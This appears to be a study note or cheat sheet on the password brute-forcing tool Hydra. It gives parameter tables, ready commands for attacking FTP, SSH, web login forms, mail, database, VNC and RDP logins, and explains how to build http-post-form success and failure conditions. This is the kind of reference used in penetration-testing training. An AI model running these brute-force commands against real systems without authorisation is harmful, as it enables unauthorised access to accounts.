# Basic Usage

|Parameter|Explanation|Usage Example|
|---|---|---|
|`-l LOGIN` or `-L FILE`|Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).|`hydra -l admin ...` or `hydra -L usernames.txt ...`|
|`-p PASS` or `-P FILE`|Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`).|`hydra -p password123 ...` or `hydra -P passwords.txt ...`|
|`-t TASKS`|Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.|`hydra -t 4 ...`|
|`-f`|Fast mode: Stop the attack after the first successful login is found.|`hydra -f ...`|
|`-s PORT`|Port: Specify a non-default port for the target service.|`hydra -s 2222 ...`|
|`-v` or `-V`|Verbose output: Display detailed information about the attack's progress, including attempts and results.|`hydra -v ...` or `hydra -V ...` (for even more verbosity)|
|`service://server`|Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.|`hydra ssh://192.168.1.100`|
|`/OPT`|Service-specific options: Provide any additional options required by the target service.|`hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication)|
# Services

| Hydra Service | Service/Protocol                 | Description                                                                                             | Example Command                                                                                                                     |
| ------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| ftp           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                                                  |
| ssh           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                                                   |
| http-get/post | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http://192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                                               |
| pop3          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                                                    |
| imap          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                                                    |
| mysql         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                                                 |
| mssql         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                                                   |
| vnc           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                                           |
| rdp           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                                                  |

## Examples
### Brute-Forcing HTTP Authentication

```sh
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
### Targeting Multiple SSH Servers

```sh
hydra -l root -p toor -M targets.txt ssh
```
### Testing FTP Credentials on a Non-Standard Port

```sh
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
### Brute-Forcing a Web Login Form

```sh
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

This command instructs Hydra to:

- Use the username "admin".
- Use the list of passwords from the `passwords.txt` file.
- Target the login form at `/login` on `www.example.com`.
- Employ the `http-post-form` module with the specified form parameters.
- Look for a successful login indicated by the HTTP status code `302`.
### Advanced RDP Brute-Forcing

```sh
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

This command instructs Hydra to:

- Use the username "administrator".
- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
- Target the RDP service on `192.168.1.100`.
- Employ the `rdp` module for the attack.

# Logon Forms

## http-post-form

The general structure of a Hydra command using `http-post-form` looks like this:

```sh
hydra [options] target http-post-form "path:params:condition_string"
```

**Condition String:**
	Hydra mainly relies on *the failure condition* `F=...` to determine when a login attempt failed.
	But we can also configure it to specify a *success condition* `S=...`

```ad-example
`hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"`
```

```ad-example
`hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
```

```ad-example
`hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"`
```
### Constructing the params String for Hydra

The `params` string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.

- `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.
- `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string. These can have static values or dynamic placeholders if their values change with each request.
- `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`).

```ad-example
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

- `"/"`: The path where the form is submitted.
- `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
- `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.

